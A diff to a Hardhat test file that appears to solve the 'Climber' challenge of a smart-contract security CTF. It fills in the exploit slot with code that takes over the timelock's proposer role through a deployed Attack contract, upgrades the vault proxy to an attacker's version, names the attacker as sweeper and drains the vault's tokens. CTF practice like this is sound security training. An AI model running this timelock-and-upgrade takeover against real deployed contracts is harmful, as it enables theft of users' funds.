@@ -53,13 +53,14 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
-        console.log("vault: ", await this.vault.owner())
-        console.log("timelock: ", await this.timelock.getRoleAdmin(ethers.utils.keccak256(ethers.utils.formatBytes32String("ADMIN_ROLE"))))
-        // console.log("deployer", deployer.address)
-        // console.log("proposer", proposer.address)
-        // console.log("sweeper", sweeper.address)
+        const timelockAttack = this.timelock.connect(attacker);
+        const attackerContract = await (await ethers.getContractFactory('Attack', attacker)).deploy(timelockAttack.address, proposer.address,this.vault.address, attacker.address);
 
-
+        await attackerContract.exploitProposership();
+        const vaultV2Factory = await ethers.getContractFactory('ClimberVaultV2', attacker);
+        this.vault = await upgrades.upgradeProxy(this.vault.address, vaultV2Factory);
+        await this.vault.changeSweeper(attacker.address)
+        await this.vault.sweepFunds(this.token.address)
     });
 
     after(async function () {
